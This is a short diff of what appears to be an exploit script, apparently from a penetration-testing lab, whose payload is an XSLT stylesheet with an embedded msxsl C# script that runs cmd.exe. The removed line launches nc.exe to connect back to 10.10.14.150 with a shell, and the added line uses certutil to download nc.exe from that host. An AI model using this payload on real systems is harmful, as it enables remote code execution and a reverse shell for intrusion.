@@ -24,7 +24,7 @@ payload = """<?xml version="1.0"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
 <msxsl:script language="C#" implements-prefix="csharp_user">
 public string xml()
-{ string cmd = "/c c:/windows/temp/nc.exe 10.10.14.150 5555 -e cmd.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();
+{ string cmd = "/c certutil -urlcache -split -f http://10.10.14.150/nc.exe c:/windows/temp/nc.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();
  proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;
  proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; 
  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output;Console.WriteLine(output); } 
